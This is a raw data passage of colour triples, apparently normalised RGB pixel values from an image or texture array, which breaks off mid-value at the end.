{0.478,0.251,0.149},{0.439,0.192,0.098},{0.424,0.18,0.086},{0.416,0.173,0.086},{0.404,0.161,0.075},{0.373,0.137,0.059},{0.365,0.133,0.055},{0.376,0.149,0.071},{0.404,0.184,0.094},{0.412,0.196,0.106},{0.424,0.208,0.11},{0.424,0.212,0.114},{0.412,0.192,0.106},{0.384,0.165,0.078},{0.361,0.141,0.059},{0.349,0.137,0.059},{0.361,0.145,0.071},{0.333,0.118,0.051},{0.263,0.067,0.027},{0.239,0.071,0.051},{0.573,0.365,0.294},{0.839,0.608,0.506},{0.945,0.729,0.608},{0.945,0.733,0.616},{0.945,0.737,0.62},{0.945,0.741,0.627},{0.953,0.749,0.635},{0.957,0.753,0.635},{0.957,0.753,0.647},{0.945,0.741,0.631},{0.937,0.737,0.616},{0.925,0.718,0.6},{0.918,0.714,0.608},{0.918,0.714,0.612},{0.929,0.725,0.62},{0.929,0.722,0.62},{0.929,0.714,0.616},{0.941,0.725,0.627},{0.945,0.725,0.631},{0.941,0.706,0.612},{0.922,0.667,0.565},{0.91,0.643,0.541},{0.914,0.643,0.541},{0.922,0.655,0.569},{0.918,0.667,0.573},{0.898,0.651,0.553},{0.886,0.639,0.541},{0.878,0.627,0.518},{0.851,0.596,0.482},{0.839,0.58,0.467},{0.839,0.588,0.478},{0.831,0.576,0.463},{0.827,0.569,0.463},
{0.824,0.565,0.471},{0.796,0.518,0.435},{0.765,0.471,0.392},{0.741,0.447,0.373},{0.706,0.4,0.318},{0.694,0.408,0.322},{0.671,0.376,0.286},{0.651,0.353,0.263},{0.627,0.337,0.247},{0.635,0.333,0.251},{0.624,0.314,0.239},{0.6,0.278,0.204},{0.6,0.29,0.216},{0.588,0.271,0.2},{0.588,0.263,0.208},{0.604,0.294,0.255},{0.6,0.275,0.227},{0.569,0.263,0.216},{0.502,0.247,0.196},{0.463,0.169,0.094},{0.635,0.365,0.255},{0.761,0.514,0.396},{0.788,0.541,0.424},{0.776,0.529,0.408},{0.769,0.522,0.4},{0.749,0.494,0.376},{0.741,0.486,0.369},{0.722,0.467,0.349},{0.71,0.455,0.333},{0.698,0.439,0.325},{0.722,0.549,0.498},{0.812,0.698,0.694},{0.627,0.427,0.29},{0.627,0.427,0.29},{0.62,0.427,0.294},{0.62,0.427,0.302},{0.584,0.4,0.29},{0.576,0.388,0.282},{0.576,0.388,0.278},{0.561,0.369,0.259},{0.553,0.357,0.247},{0.573,0.38,0.271},{0.584,0.392,0.286},{0.565,0.369,0.259},{0.525,0.318,0.208},{0.486,0.259,0.157},{0.459,0.212,0.106},{0.463,0.204,0.102},{0.467,0.204,0.098},{0.463,0.192,0.094},{0.455,0.184,0.086},{0.451,0.176,0.094},{0.435,0.161,0.086},
{0.424,0.157,0.082},{0.408,0.149,0.075},{0.392,0.137,0.063},{0.376,0.129,0.059},{0.384,0.137,0.063},{0.392,0.149,0.067},{0.408,0.169,0.082},{0.408,0.173,0.086},{0.404,0.173,0.086},{0.369,0.149,0.067},{0.325,0.102,0.027},{0.294,0.078,0.02},{0.259,0.059,0.012},{0.224,0.035,0.008},{0.227,0.035,0.008},{0.243,0.047,0.012},{0.369,0.161,0.098},{0.569,0.357,0.267},{0.847,0.616,0.494},{0.918,0.702,0.58},{0.937,0.722,0.604},{0.941,0.729,0.612},{0.945,0.733,0.616},{0.945,0.741,0.631},{0.941,0.741,0.624},{0.941,0.741,0.627},{0.941,0.737,0.635},{0.937,0.733,0.631},{0.941,0.737,0.639},{0.941,0.745,0.647},{0.945,0.737,0.647},{0.953,0.745,0.655},{0.957,0.741,0.651},{0.957,0.741,0.659},{0.953,0.725,0.639},{0.949,0.722,0.639},{0.965,0.757,0.682},{0.969,0.761,0.686},{0.969,0.765,0.69},{0.965,0.761,0.682},{0.961,0.753,0.678},{0.957,0.749,0.671},{0.937,0.714,0.631},{0.922,0.682,0.584},{0.918,0.675,0.576},{0.91,0.659,0.561},{0.902,0.647,0.553},{0.886,0.596,0.506},{0.863,0.576,0.498},{0.867,0.569,0.502},{0.875,0.604,0.537},{0.855,0.588,0.502},{0.847,0.596,0.506},
{0.835,0.588,0.502},{0.827,0.573,0.486},{0.812,0.557,0.463},{0.788,0.525,0.427},{0.776,0.49,0.404},{0.776,0.502,0.416},{0.776,0.482,0.388},{0.745,0.404,0.318},{0.773,0.51,0.478},{0.792,0.549,0.537},{0.804,0.545,0.522},{0.816,0.62,0.592},{0.863,0.78,0.761},{0.647,0.361,0.271},{0.753,0.49,0.369},{0.804,0.561,0.443},{0.8,0.561,0.439},{0.784,0.549,0.427},{0.776,0.533,0.412},{0.765,0.518,0.396},{0.745,0.498,0.376},{0.733,0.482,0.361},{0.725,0.471,0.353},{0.71,0.455,0.337},{0.741,0.584,0.545},{0.827,0.718,0.718},{0.706,0.514,0.373},{0.706,0.514,0.373},{0.694,0.506,0.376},{0.686,0.502,0.376},{0.698,0.514,0.4},{0.686,0.506,0.392},{0.651,0.463,0.349},{0.608,0.416,0.298},{0.557,0.357,0.239},{0.51,0.29,0.184},{0.494,0.267,0.165},{0.525,0.298,0.188},{0.545,0.329,0.22},{0.529,0.302,0.192},{0.541,0.302,0.188},{0.565,0.314,0.204},{0.545,0.29,0.184},{0.518,0.255,0.157},{0.502,0.235,0.149},{0.478,0.212,0.129},{0.463,0.188,0.11},{0.447,0.176,0.098},{0.431,0.161,0.09},{0.412,0.149,0.078},{0.396,0.137,0.071},{0.388,0.129,0.063},{0.38,0.133,0.059},
{0.373,0.133,0.059},{0.357,0.125,0.051},{0.349,0.125,0.047},{0.333,0.114,0.035},{0.325,0.106,0.031},{0.314,0.094,0.027},{0.298,0.082,0.02},{0.275,0.071,0.012},{0.255,0.063,0.008},{0.247,0.055,0.004},{0.251,0.055,0},{0.286,0.082,0.02},{0.694,0.431,0.29},{0.765,0.522,0.376},{0.808,0.573,0.439},{0.859,0.635,0.506},{0.902,0.682,0.561},{0.925,0.714,0.596},{0.933,0.725,0.608},{0.933,0.722,0.604},{0.933,0.729,0.616},{0.933,0.729,0.624},{0.941,0.741,0.643},{0.945,0.749,0.659},{0.949,0.757,0.667},{0.957,0.761,0.675},{0.957,0.757,0.671},{0.961,0.757,0.678},{0.965,0.761,0.682},{0.965,0.765,0.682},{0.969,0.773,0.69},{0.973,0.761,0.682},{0.965,0.753,0.678},{0.961,0.745,0.667},{0.945,0.722,0.647},{0.89,0.671,0.596},{0.894,0.663,0.573},{0.925,0.694,0.6},{0.941,0.714,0.631},{0.953,0.733,0.655},{0.949,0.729,0.659},{0.941,0.71,0.635},{0.929,0.69,0.616},{0.922,0.663,0.596},{0.929,0.69,0.631},{0.922,0.678,0.612},{0.929,0.71,0.643},{0.929,0.718,0.651},{0.937,0.71,0.643},{0.929,0.702,0.635},{0.914,0.671,0.596},{0.894,0.627,0.561},{0.91,0.655,0.592},
{0.894,0.627,0.557},{0.871,0.584,0.533},{0.894,0.643,0.616},{0.925,0.753,0.745},{0.941,0.773,0.753},{0.957,0.867,0.855},{0.976,0.941,0.929},{0.812,0.565,0.451},{0.816,0.569,0.439},{0.812,0.569,0.443},{0.804,0.561,0.439},{0.792,0.557,0.435},{0.784,0.545,0.424},{0.776,0.533,0.412},{0.765,0.514,0.396},{0.753,0.502,0.384},{0.741,0.49,0.373},{0.729,0.475,0.361},{0.757,0.624,0.592},{0.851,0.741,0.745},{0.796,0.612,0.471},{0.796,0.612,0.471},{0.776,0.592,0.455},{0.745,0.557,0.416},{0.714,0.514,0.38},{0.682,0.478,0.349},{0.667,0.463,0.341},{0.663,0.463,0.341},{0.663,0.463,0.337},{0.678,0.475,0.353},{0.675,0.467,0.341},{0.655,0.427,0.302},{0.616,0.373,0.251},{0.584,0.329,0.212},{0.588,0.325,0.204},{0.608,0.341,0.224},{0.6,0.329,0.216},{0.565,0.298,0.192},{0.537,0.267,0.165},{0.518,0.243,0.153},{0.486,0.216,0.137},{0.463,0.196,0.114},{0.443,0.176,0.094},{0.427,0.161,0.086},{0.408,0.149,0.082},{0.4,0.141,0.075},{0.4,0.145,0.075},{0.392,0.145,0.075},{0.38,0.141,0.067},{0.369,0.137,0.067},{0.361,0.133,0.059},{0.349,0.125,0.051},{0.337,0.118,0.043},
{0.329,0.11,0.035},{0.306,0.09,0.024},{0.282,0.078,0.012},{0.255,0.063,0.008},{0.243,0.051,0.012},{0.267,0.067,0.012},{0.671,0.416,0.271},{0.765,0.518,0.369},{0.784,0.537,0.396},{0.796,0.553,0.412},{0.812,0.576,0.435},{0.835,0.604,0.471},{0.875,0.647,0.518},{0.894,0.671,0.549},{0.914,0.698,0.584},{0.925,0.714,0.604},{0.937,0.733,0.635},{0.941,0.753,0.663},{0.945,0.761,0.671},{0.953,0.765,0.678},{0.961,0.769,0.686},{0.961,0.765,0.682},{0.965,0.757,0.678},{0.961,0.765,0.682},{0.941,0.725,0.643},{0.851,0.569,0.49},{0.706,0.353,0.282},{0.565,0.18,0.122},{0.486,0.118,0.063},{0.365,0.059,0.027},{0.341,0.098,0.063},{0.749,0.463,0.329},{0.843,0.569,0.42},{0.863,0.596,0.447},{0.867,0.608,0.467},{0.878,0.62,0.49},{0.875,0.612,0.486},{0.886,0.624,0.502},{0.89,0.627,0.518},{0.894,0.631,0.529},{0.906,0.655,0.557},{0.906,0.651,0.557},{0.898,0.639,0.541},{0.89,0.624,0.533},{0.878,0.612,0.522},{0.882,0.62,0.537},{0.89,0.627,0.545},{0.91,0.659,0.58},{0.918,0.659,0.596},{0.906,0.639,0.58},{0.878,0.576,0.502},{0.855,0.553,0.455},{0.824,0.541,0.427},
{0.804,0.537,0.412},{0.812,0.553,0.42},{0.812,0.565,0.435},{0.82,0.58,0.455},{0.816,0.573,0.451},{0.808,0.573,0.451},{0.796,0.565,0.443},{0.796,0.561,0.443},{0.788,0.545,0.424},{0.78,0.525,0.408},{0.769,0.514,0.392},{0.753,0.51,0.396},{0.776,0.647,0.631},{0.863,0.761,0.765},{0.886,0.733,0.608},{0.886,0.733,0.608},{0.871,0.718,0.6},{0.855,0.698,0.584},{0.82,0.659,0.545},{0.769,0.592,0.471},{0.682,0.482,0.365},{0.698,0.478,0.365},{0.749,0.506,0.384},{0.741,0.478,0.361},{0.718,0.443,0.329},{0.694,0.412,0.298},{0.667,0.396,0.286},{0.647,0.38,0.271},{0.651,0.38,0.263},{0.671,0.4,0.282},{0.667,0.392,0.267},{0.635,0.357,0.243},{0.6,0.318,0.216},{0.569,0.286,0.188},{0.537,0.255,0.161},{0.518,0.231,0.141},{0.494,0.216,0.125},{0.471,0.188,0.11},{0.447,0.176,0.098},{0.439,0.173,0.098},{0.431,0.165,0.094},{0.427,0.165,0.098},{0.431,0.173,0.098},{0.42,0.169,0.094},{0.404,0.161,0.086},{0.38,0.145,0.075},{0.369,0.141,0.071},{0.353,0.133,0.055},{0.329,0.11,0.043},{0.31,0.094,0.027},{0.275,0.075,0.016},{0.247,0.059,0.008},{0.247,0.059,0.012},
{0.6,0.345,0.224},{0.773,0.518,0.369},{0.792,0.541,0.396},{0.804,0.565,0.42},{0.82,0.584,0.439},{0.835,0.6,0.459},{0.843,0.608,0.467},{0.835,0.596,0.455},{0.835,0.596,0.467},{0.851,0.616,0.486},{0.871,0.643,0.522},{0.89,0.678,0.576},{0.933,0.725,0.639},{0.945,0.725,0.639},{0.945,0.725,0.635},{0.941,0.71,0.624},{0.937,0.714,0.624},{0.929,0.694,0.604},{0.898,0.62,0.525},{0.871,0.569,0.471},{0.831,0.514,0.424},{0.757,0.416,0.329},{0.686,0.318,0.239},{0.62,0.231,0.149},{0.522,0.149,0.086},{0.416,0.122,0.075},{0.702,0.42,0.294},{0.835,0.553,0.4},{0.839,0.565,0.404},{0.835,0.569,0.408},{0.835,0.561,0.4},{0.839,0.573,0.416},{0.827,0.549,0.392},{0.812,0.525,0.369},{0.812,0.522,0.373},{0.808,0.518,0.361},{0.792,0.486,0.337},{0.78,0.467,0.322},{0.78,0.463,0.318},{0.78,0.467,0.325},{0.773,0.463,0.325},{0.769,0.451,0.318},{0.765,0.455,0.318},{0.78,0.471,0.337},{0.784,0.49,0.353},{0.796,0.518,0.384},{0.808,0.545,0.408},{0.816,0.565,0.435},{0.82,0.58,0.455},{0.827,0.584,0.451},{0.831,0.592,0.463},{0.827,0.588,0.463},{0.824,0.588,0.467},
{0.816,0.584,0.463},{0.804,0.573,0.455},{0.8,0.557,0.443},{0.796,0.549,0.427},{0.788,0.533,0.408},{0.773,0.537,0.431},{0.792,0.675,0.663},{0.871,0.773,0.776},{0.843,0.631,0.494},{0.843,0.631,0.494},{0.82,0.588,0.447},{0.788,0.549,0.4},{0.737,0.49,0.349},{0.596,0.357,0.243},{0.671,0.424,0.314},{0.8,0.549,0.431},{0.808,0.537,0.42},{0.769,0.482,0.376},{0.698,0.412,0.314},{0.616,0.345,0.263},{0.502,0.275,0.2},{0.533,0.294,0.22},{0.675,0.408,0.302},{0.733,0.467,0.341},{0.733,0.455,0.329},{0.718,0.424,0.302},{0.694,0.392,0.271},{0.655,0.349,0.235},{0.624,0.314,0.204},{0.6,0.29,0.184},{0.561,0.259,0.161},{0.537,0.243,0.149},{0.522,0.227,0.141},{0.506,0.224,0.141},{0.482,0.208,0.122},{0.467,0.188,0.106},{0.463,0.188,0.11},{0.451,0.184,0.11},{0.435,0.176,0.098},{0.416,0.165,0.09},{0.396,0.153,0.086},{0.384,0.145,0.075},{0.357,0.133,0.059},{0.329,0.11,0.043},{0.298,0.09,0.027},{0.267,0.071,0.016},{0.247,0.063,0.008},{0.455,0.227,0.125},{0.773,0.514,0.369},{0.8,0.549,0.404},{0.812,0.576,0.431},{0.827,0.592,0.447},{0.835,0.6,0.459},
{0.851,0.616,0.478},{0.851,0.624,0.49},{0.855,0.627,0.494},{0.859,0.624,0.494},{0.855,0.624,0.49},{0.557,0.384,0.318},{0.255,0.165,0.173},{0.408,0.278,0.251},{0.588,0.431,0.38},{0.82,0.624,0.545},{0.941,0.729,0.635},{0.945,0.745,0.639},{0.941,0.737,0.639},{0.918,0.698,0.596},{0.878,0.631,0.525},{0.851,0.576,0.478},{0.808,0.502,0.42},{0.761,0.427,0.333},{0.698,0.322,0.227},{0.612,0.224,0.141},{0.471,0.129,0.075},{0.667,0.373,0.263},{0.82,0.537,0.392},{0.824,0.549,0.4},{0.824,0.545,0.396},{0.831,0.557,0.404},{0.827,0.561,0.404},{0.831,0.561,0.404},{0.824,0.549,0.388},{0.82,0.549,0.396},{0.82,0.537,0.384},{0.824,0.541,0.392},{0.816,0.533,0.392},{0.82,0.533,0.396},{0.816,0.533,0.396},{0.816,0.529,0.396},{0.816,0.529,0.396},{0.812,0.541,0.404},{0.816,0.545,0.404},{0.824,0.557,0.424},{0.835,0.576,0.439},{0.843,0.6,0.463},{0.851,0.616,0.482},{0.851,0.616,0.49},{0.859,0.62,0.498},{0.855,0.62,0.498},{0.847,0.616,0.494},{0.839,0.604,0.482},{0.831,0.596,0.475},{0.824,0.584,0.463},{0.82,0.58,0.459},{0.804,0.553,0.431},{0.792,0.573,0.482},
{0.812,0.706,0.694},{0.875,0.78,0.788},{0.804,0.541,0.38},{0.804,0.541,0.38},{0.792,0.529,0.369},{0.78,0.525,0.373},{0.706,0.451,0.314},{0.557,0.318,0.22},{0.808,0.576,0.482},{0.863,0.616,0.51},{0.812,0.545,0.435},{0.706,0.412,0.314},{0.584,0.294,0.212},{0.471,0.227,0.161},{0.231,0.094,0.063},{0.247,0.094,0.059},{0.643,0.384,0.282},{0.773,0.51,0.384},{0.78,0.494,0.369},{0.776,0.478,0.349},{0.753,0.455,0.329},{0.729,0.424,0.302},{0.698,0.384,0.259},{0.671,0.353,0.235},{0.639,0.322,0.212},{0.616,0.302,0.192},{0.588,0.29,0.184},{0.573,0.286,0.18},{0.557,0.271,0.165},{0.541,0.251,0.153},{0.533,0.247,0.149},{0.51,0.231,0.141},{0.498,0.227,0.133},{0.478,0.216,0.129},{0.451,0.192,0.11},{0.424,0.173,0.094},{0.4,0.157,0.082},{0.365,0.133,0.063},{0.325,0.11,0.047},{0.282,0.082,0.024},{0.255,0.063,0.012},{0.29,0.09,0.035},{0.725,0.467,0.325},{0.808,0.557,0.416},{0.824,0.588,0.447},{0.839,0.604,0.467},{0.843,0.608,0.471},{0.859,0.627,0.494},{0.863,0.647,0.514},{0.863,0.651,0.522},{0.871,0.647,0.522},{0.871,0.651,0.525},{0.482,0.337,0.286},
{0.129,0.067,0.086},{0.2,0.133,0.169},{0.082,0.027,0.039},{0.098,0.039,0.055},{0.263,0.161,0.145},{0.702,0.498,0.412},{0.894,0.667,0.561},{0.922,0.698,0.604},{0.906,0.667,0.573},{0.875,0.616,0.514},{0.839,0.561,0.459},{0.792,0.494,0.388},{0.729,0.392,0.298},{0.667,0.294,0.208},{0.612,0.216,0.137},{0.463,0.118,0.063},{0.6,0.314,0.212},{0.792,0.51,0.373},{0.82,0.545,0.396},{0.831,0.557,0.404},{0.827,0.569,0.412},{0.839,0.569,0.412},{0.839,0.576,0.424},{0.851,0.584,0.431},{0.847,0.588,0.439},{0.851,0.588,0.439},{0.851,0.584,0.443},{0.851,0.584,0.443},{0.855,0.588,0.451},{0.851,0.584,0.447},{0.855,0.588,0.451},{0.851,0.592,0.451},{0.851,0.596,0.459},{0.859,0.612,0.475},{0.867,0.627,0.494},{0.867,0.631,0.502},{0.875,0.639,0.514},{0.878,0.647,0.522},{0.875,0.639,0.522},{0.875,0.643,0.522},{0.867,0.631,0.514},{0.863,0.627,0.506},{0.855,0.624,0.498},{0.851,0.612,0.494},{0.839,0.604,0.478},{0.835,0.592,0.471},{0.812,0.616,0.537},{0.827,0.725,0.714},{0.875,0.784,0.788},{0.812,0.549,0.392},{0.812,0.549,0.392},{0.812,0.549,0.392},{0.812,0.561,0.416},
{0.655,0.424,0.31},{0.537,0.325,0.255},{0.855,0.639,0.561},{0.859,0.616,0.51},{0.761,0.478,0.376},{0.655,0.353,0.255},{0.565,0.282,0.2},{0.365,0.169,0.114},{0.09,0.024,0.016},{0.286,0.122,0.078},{0.706,0.455,0.345},{0.788,0.525,0.4},{0.808,0.522,0.392},{0.816,0.518,0.388},{0.8,0.502,0.373},{0.773,0.463,0.337},{0.745,0.431,0.31},{0.718,0.396,0.278},{0.69,0.369,0.255},{0.659,0.345,0.231},{0.647,0.337,0.224},{0.627,0.329,0.216},{0.616,0.325,0.212},{0.6,0.306,0.192},{0.584,0.294,0.184},{0.573,0.286,0.18},{0.557,0.278,0.169},{0.537,0.263,0.161},{0.51,0.247,0.153},{0.482,0.224,0.133},{0.451,0.192,0.11},{0.408,0.161,0.086},{0.361,0.133,0.063},{0.314,0.098,0.039},{0.259,0.071,0.016},{0.235,0.051,0.016},{0.49,0.259,0.161},{0.792,0.541,0.396},{0.824,0.584,0.443},{0.843,0.608,0.467},{0.851,0.616,0.482},{0.855,0.631,0.494},{0.863,0.651,0.518},{0.871,0.659,0.529},{0.878,0.663,0.537},{0.882,0.667,0.537},{0.765,0.569,0.467},{0.192,0.11,0.118},{0.188,0.129,0.161},{0.149,0.09,0.118},{0.102,0.047,0.067},{0.212,0.149,0.188},{0.29,0.169,0.149},
{0.706,0.443,0.302},{0.757,0.498,0.361},{0.831,0.576,0.459},{0.89,0.639,0.541},{0.89,0.639,0.541},{0.867,0.6,0.498},{0.831,0.545,0.447},{0.784,0.463,0.369},{0.722,0.345,0.259},{0.635,0.243,0.153},{0.486,0.129,0.071},{0.651,0.365,0.251},{0.82,0.541,0.396},{0.831,0.557,0.416},{0.835,0.576,0.424},{0.847,0.58,0.435},{0.859,0.6,0.459},{0.867,0.608,0.463},{0.867,0.612,0.463},{0.867,0.604,0.455},{0.867,0.608,0.463},{0.871,0.612,0.471},{0.875,0.62,0.482},{0.878,0.624,0.486},{0.886,0.635,0.494},{0.882,0.635,0.498},{0.882,0.631,0.498},{0.886,0.639,0.502},{0.89,0.651,0.514},{0.89,0.655,0.533},{0.89,0.651,0.533},{0.894,0.659,0.537},{0.89,0.659,0.537},{0.886,0.655,0.533},{0.882,0.647,0.529},{0.875,0.635,0.518},{0.867,0.635,0.514},{0.867,0.627,0.506},{0.859,0.624,0.502},{0.855,0.612,0.49},{0.816,0.635,0.573},{0.839,0.733,0.729},{0.875,0.776,0.784},{0.839,0.584,0.424},{0.839,0.584,0.424},{0.847,0.596,0.439},{0.843,0.6,0.463},{0.588,0.373,0.282},{0.561,0.341,0.259},{0.827,0.596,0.498},{0.855,0.604,0.494},{0.78,0.514,0.408},{0.765,0.498,0.392},
{0.631,0.38,0.302},{0.318,0.169,0.133},{0.161,0.047,0.031},{0.569,0.329,0.243},{0.761,0.514,0.408},{0.8,0.537,0.408},{0.827,0.549,0.416},{0.843,0.553,0.42},{0.824,0.525,0.396},{0.8,0.49,0.365},{0.776,0.463,0.337},{0.749,0.435,0.306},{0.722,0.404,0.286},{0.694,0.384,0.259},{0.675,0.369,0.247},{0.663,0.369,0.243},{0.643,0.357,0.235},{0.627,0.333,0.22},{0.62,0.322,0.212},{0.608,0.318,0.204},{0.592,0.31,0.192},{0.576,0.302,0.188},{0.549,0.282,0.173},{0.525,0.263,0.161},{0.498,0.239,0.137},{0.463,0.204,0.114},{0.404,0.161,0.086},{0.341,0.114,0.051},{0.278,0.078,0.02},{0.231,0.047,0.012},{0.235,0.051,0.02},{0.639,0.392,0.271},{0.808,0.561,0.42},{0.835,0.592,0.455},{0.847,0.612,0.471},{0.859,0.624,0.49},{0.867,0.643,0.514},{0.871,0.655,0.522},{0.882,0.671,0.541},{0.886,0.675,0.545},{0.894,0.675,0.545},{0.741,0.557,0.475},{0.184,0.106,0.118},{0.165,0.11,0.137},{0.106,0.051,0.075},{0.078,0.031,0.051},{0.184,0.122,0.141},{0.647,0.404,0.286},{0.725,0.451,0.306},{0.757,0.49,0.349},{0.784,0.522,0.38},{0.835,0.573,0.459},{0.882,0.627,0.533},
{0.89,0.624,0.529},{0.878,0.612,0.518},{0.847,0.565,0.475},{0.788,0.435,0.345},{0.686,0.271,0.192},{0.514,0.141,0.082},{0.729,0.447,0.314},{0.824,0.557,0.396},{0.843,0.584,0.435},{0.855,0.596,0.455},{0.871,0.616,0.475},{0.875,0.627,0.486},{0.882,0.631,0.486},{0.886,0.627,0.49},{0.875,0.616,0.478},{0.886,0.631,0.49},{0.898,0.647,0.506},{0.906,0.663,0.525},{0.902,0.659,0.522},{0.902,0.663,0.525},{0.902,0.655,0.525},{0.902,0.659,0.529},{0.906,0.671,0.545},{0.914,0.671,0.557},{0.91,0.675,0.561},{0.906,0.671,0.553},{0.91,0.678,0.561},{0.91,0.682,0.565},{0.902,0.675,0.557},{0.902,0.667,0.553},{0.894,0.667,0.545},{0.89,0.659,0.537},{0.878,0.635,0.518},{0.871,0.631,0.506},{0.824,0.663,0.608},{0.855,0.753,0.749},{0.875,0.78,0.788},{0.867,0.608,0.463},{0.867,0.608,0.463},{0.875,0.62,0.482},{0.851,0.616,0.486},{0.584,0.361,0.271},{0.604,0.349,0.243},{0.796,0.549,0.431},{0.851,0.6,0.482},{0.812,0.549,0.443},{0.827,0.584,0.482},{0.667,0.467,0.396},{0.231,0.118,0.09},{0.471,0.259,0.192},{0.733,0.486,0.392},{0.796,0.549,0.435},{0.824,0.565,0.435},
{0.839,0.569,0.431},{0.835,0.553,0.416},{0.827,0.537,0.4},{0.816,0.518,0.384},{0.792,0.482,0.353},{0.769,0.459,0.329},{0.737,0.427,0.302},{0.714,0.4,0.282},{0.69,0.384,0.259},{0.663,0.361,0.243},{0.647,0.357,0.239},{0.643,0.349,0.235},{0.631,0.345,0.227},{0.616,0.329,0.216},{0.604,0.314,0.2},{0.588,0.306,0.188},{0.569,0.294,0.176},{0.537,0.275,0.165},{0.51,0.247,0.145},{0.475,0.216,0.129},{0.431,0.184,0.098},{0.369,0.141,0.067},{0.302,0.098,0.031},{0.239,0.051,0.012},{0.2,0.024,0.008},{0.259,0.071,0.035},{0.682,0.431,0.302},{0.816,0.565,0.424},{0.835,0.592,0.451},{0.851,0.608,0.471},{0.867,0.631,0.498},{0.871,0.655,0.522},{0.878,0.667,0.529},{0.886,0.675,0.541},{0.894,0.678,0.541},{0.894,0.667,0.529},{0.749,0.533,0.427},{0.29,0.196,0.204},{0.165,0.106,0.141},{0.047,0.012,0.02},{0.133,0.071,0.082},{0.612,0.365,0.255},{0.682,0.412,0.275},{0.714,0.435,0.298},{0.718,0.447,0.31},{0.729,0.455,0.325},{0.733,0.471,0.341},{0.792,0.533,0.427},{0.882,0.643,0.557},{0.875,0.624,0.545},{0.843,0.561,0.494},{0.78,0.427,0.365},{0.675,0.255,0.184},
{0.529,0.169,0.106},{0.784,0.514,0.373},{0.855,0.6,0.451},{0.859,0.6,0.455},{0.871,0.62,0.475},{0.878,0.624,0.478},{0.894,0.639,0.502},{0.902,0.651,0.51},{0.906,0.655,0.518},{0.914,0.663,0.525},{0.918,0.678,0.537},{0.925,0.694,0.553},{0.925,0.686,0.549},{0.922,0.694,0.561},{0.918,0.678,0.545},{0.922,0.682,0.557},{0.918,0.682,0.561},{0.929,0.698,0.58},{0.929,0.698,0.588},{0.922,0.69,0.573},{0.922,0.694,0.573},{0.922,0.702,0.588},{0.925,0.698,0.588},{0.918,0.682,0.573},{0.91,0.682,0.565},{0.906,0.675,0.557},{0.894,0.663,0.541},{0.886,0.651,0.529},{0.827,0.678,0.639},{0.859,0.761,0.757},{0.875,0.78,0.784},{0.878,0.624,0.478},{0.878,0.624,0.478},{0.894,0.643,0.506},{0.875,0.639,0.51},{0.678,0.439,0.329},{0.643,0.373,0.251},{0.769,0.51,0.388},{0.82,0.569,0.455},{0.824,0.565,0.455},{0.776,0.514,0.404},{0.518,0.322,0.259},{0.302,0.145,0.098},{0.678,0.431,0.353},{0.78,0.533,0.431},{0.804,0.549,0.435},{0.82,0.557,0.427},{0.824,0.549,0.412},{0.835,0.553,0.412},{0.835,0.541,0.408},{0.827,0.529,0.396},{0.808,0.502,0.373},{0.784,0.475,0.345},
{0.761,0.455,0.325},{0.737,0.439,0.306},{0.71,0.404,0.282},{0.682,0.38,0.263},{0.663,0.361,0.247},{0.651,0.361,0.243},{0.643,0.357,0.235},{0.635,0.341,0.227},{0.62,0.329,0.22},{0.596,0.31,0.196},{0.584,0.302,0.184},{0.557,0.286,0.173},{0.533,0.263,0.161},{0.498,0.235,0.137},{0.463,0.208,0.118},{0.412,0.169,0.086},{0.333,0.118,0.047},{0.251,0.063,0.016},{0.196,0.024,0.008},{0.18,0.016,0.008},{0.267,0.075,0.035},{0.635,0.384,0.267},{0.812,0.557,0.416},{0.839,0.592,0.451},{0.855,0.616,0.475},{0.871,0.639,0.498},{0.878,0.655,0.514},{0.886,0.663,0.522},{0.886,0.659,0.522},{0.886,0.655,0.518},{0.882,0.643,0.498},{0.804,0.573,0.447},{0.4,0.318,0.302},{0.173,0.271,0.31},{0.424,0.318,0.275},{0.627,0.361,0.243},{0.647,0.373,0.247},{0.655,0.373,0.251},{0.663,0.384,0.267},{0.659,0.376,0.255},{0.647,0.369,0.255},{0.651,0.376,0.263},{0.682,0.408,0.294},{0.761,0.494,0.388},{0.831,0.584,0.525},{0.847,0.561,0.514},{0.788,0.416,0.353},{0.675,0.259,0.184},{0.592,0.243,0.165},{0.827,0.561,0.416},{0.863,0.612,0.467},{0.878,0.627,0.486},{0.89,0.635,0.498},
{0.902,0.651,0.514},{0.91,0.663,0.529},{0.918,0.671,0.533},{0.922,0.678,0.545},{0.925,0.686,0.545},{0.929,0.702,0.561},{0.937,0.706,0.569},{0.933,0.706,0.569},{0.937,0.702,0.573},{0.941,0.706,0.576},{0.941,0.706,0.58},{0.937,0.702,0.584},{0.937,0.718,0.596},{0.941,0.718,0.596},{0.933,0.71,0.588},{0.933,0.71,0.592},{0.937,0.714,0.596},{0.933,0.71,0.588},{0.929,0.706,0.588},{0.925,0.694,0.576},{0.91,0.678,0.557},{0.902,0.671,0.557},{0.827,0.698,0.675},{0.867,0.769,0.765},{0.875,0.773,0.784},{0.89,0.631,0.49},{0.89,0.631,0.49},{0.906,0.655,0.522},{0.902,0.655,0.525},{0.835,0.592,0.467},{0.769,0.502,0.361},{0.769,0.498,0.369},{0.753,0.49,0.376},{0.753,0.498,0.388},{0.71,0.455,0.353},{0.49,0.275,0.2},{0.604,0.353,0.263},{0.741,0.482,0.376},{0.773,0.51,0.392},{0.78,0.518,0.384},{0.796,0.529,0.392},{0.816,0.541,0.4},{0.839,0.553,0.412},{0.851,0.553,0.42},{0.843,0.545,0.412},{0.827,0.529,0.396},{0.804,0.498,0.369},{0.776,0.471,0.341},{0.753,0.455,0.322},{0.725,0.427,0.302},{0.71,0.408,0.29},{0.698,0.388,0.271},{0.678,0.38,0.259},
{0.678,0.376,0.259},{0.671,0.373,0.251},{0.655,0.357,0.235},{0.631,0.341,0.22},{0.608,0.318,0.204},{0.58,0.302,0.184},{0.553,0.282,0.169},{0.522,0.259,0.153},{0.49,0.231,0.133},{0.435,0.184,0.102},{0.337,0.118,0.051},{0.255,0.067,0.012},{0.192,0.027,0.012},{0.176,0.012,0.008},{0.2,0.027,0.008},{0.29,0.094,0.027},{0.502,0.271,0.161},{0.733,0.478,0.341},{0.812,0.557,0.416},{0.847,0.6,0.455},{0.863,0.624,0.478},{0.875,0.635,0.494},{0.878,0.643,0.498},{0.882,0.647,0.502},{0.882,0.647,0.506},{0.745,0.624,0.537},{0.804,0.624,0.518},{0.6,0.384,0.31},{0.624,0.376,0.271},{0.671,0.404,0.282},{0.671,0.396,0.271},{0.655,0.373,0.251},{0.635,0.353,0.239},{0.612,0.329,0.224},{0.62,0.345,0.239},{0.631,0.353,0.247},{0.655,0.38,0.271},{0.675,0.4,0.29},{0.714,0.451,0.357},{0.859,